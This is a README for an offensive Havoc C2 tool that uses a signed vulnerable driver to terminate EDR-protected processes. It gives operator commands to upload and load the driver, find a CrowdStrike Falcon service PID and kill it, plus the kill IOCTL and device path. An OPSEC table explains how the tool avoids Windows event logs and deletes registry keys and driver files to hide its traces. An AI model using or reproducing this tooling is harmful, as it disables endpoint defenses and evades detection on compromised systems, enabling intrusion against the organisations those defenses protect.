# PoisonKiller BOF

A Havoc C2 BOF implementation of BYOVD (Bring Your Own Vulnerable Driver) to terminate EDR-protected processes. Based on the research by [@j3h4ck](https://github.com/j3h4ck/PoisonKiller).

---

## Quick Usage

```
# 1. Upload the driver to the target
upload /local/path/PoisonX.sys C:\Temp\PoisonX.sys

# 2. Load the driver
pk-load "C:\Temp\PoisonX.sys"

# 3. Get the PID of the target process
shell tasklist | findstr /i "CSFalconService"

# 4. Kill the process
pk-kill <PID>

# 5. Unload the driver
pk-unload <name> "C:\Temp\PoisonX.sys"

# 6. Delete the .sys from disk
pk-delete "C:\Temp\PoisonX.sys"

# 7. Clear state
pk-clear-state
```

> **Important**: Always use a clean, dedicated sacrificial beacon for driver operations. Do not use your main C2 beacon.

## Requirements

- Havoc C2
- Beacon running with elevated administrator privileges (High Integrity)
- `SeLoadDriverPrivilege` enabled in the token
- `PoisonX.sys` available on the target

## Installation

### Dependencies

```bash
sudo apt install mingw-w64
```

### Build

```bash
make clean && make
```

Compiled BOFs are output to `out/`:

```
out/
├── bof_loaddriver.x64.o
├── bof_killprocess.x64.o
├── bof_unloaddriver.x64.o
├── bof_delete.x64.o
└── bof_kill_multi.x64.o
```

### Configure the Python module

Edit `poisonkiller.py` and set `BASE_DIR` for your environment:

```python
# Example
BASE_DIR = "/home/user/tools/PoisonKiller"
```

### Load in Havoc

```
Scripts > Load > /path/to/project/poisonkiller.py
```

## Commands

| Command | Arguments | Description |
|---|---|---|
| `pk-load` | `"<path_sys>"` | Load driver via NtLoadDriver (no SCM) |
| `pk-kill` | `<PID>` | Kill a process via driver IOCTL |
| `pk-kill-multi` | `<PID1> <PID2> ... <PIDN>` | Kill multiple processes in rapid succession |
| `pk-unload` | `<name> "<path_sys>"` | Unload the driver |
| `pk-delete` | `"<path_sys>"` | Delete the .sys from disk |
| `pk-clear-state` | — | Clear module state after successful unload |
| `pk-status` | — | Show current module state |
| `pk-debug` | — | API diagnostic test on the target |

## Technical Details

### Driver

- **Signed by**: Microsoft Windows Hardware Compatibility Publisher
- **Signing date**: 2025-03-25
- **Device path**: `\\.\{F8284233-48F4-4680-ADDD-F8284233}`
- **Kill IOCTL**: `0x22E010`
- **Mechanism**: `ZwOpenProcess` + `ZwTerminateProcess` from kernel — bypasses PPL

### Driver Loading (OPSEC)

- Uses `NtLoadDriver` directly — **bypasses the SCM entirely**
- Does not generate **event 7045** (New Service Installed) or **4697**
- Registry key created under `HKLM\SYSTEM\CurrentControlSet\Services\<random_name>`
- Random 8-character lowercase name generated on each execution
- Registry key deleted **immediately** after loading
- `.sys` deleted from disk via `pk-delete` after unload

### Unload Flow

The `.sys` file must be deleted **after** unloading with `pk-delete` — not during. Deleting the file during unload causes beacon crashes in subsequent load/unload cycles.

### State Persistence

If the Havoc session is lost, state is automatically restored from `.pk_state` when the script is reloaded:

```
[*] State restored: driver='abcdefgh' path='C:\Temp\PoisonX.sys'
```

If the session is lost without `.pk_state`:

```bash

# Force unload by name
pk-unload <name>
```

## OPSEC Assessment

| Factor | Status |
|---|---|
| Event 7045 (SCM) | ✅ Not generated |
| Persistent registry key | ✅ Deleted immediately after load |
| Driver name | ✅ Random per execution |
| .sys on disk after operation | ✅ Deleted via pk-delete |
| New process creation | ✅ BOF — no CreateProcess |
| Event 4688 | ✅ Not generated |
| Sysmon event 6 (driver load) | ⚠️ Generated — unavoidable with NtLoadDriver |
| Device path GUID | ⚠️ Known IOC — published on GitHub |
| PDB path in binary | ⚠️ `Hide.pdb` present in the driver |
| HKLM write | ⚠️ Required for NtLoadDriver |

## Known Issues / Bugs

- **Beacon instability after intensive use** — loading/unloading drivers and killing processes in the same beacon session causes accumulated state corruption. The beacon may crash unexpectedly during subsequent operations. **Always use a fresh, dedicated sacrificial beacon exclusively for PoisonKiller operations.** Never use your main persistence beacon. If the sacrificial beacon dies, spawn a new one and continue. I did not manage to solve this.
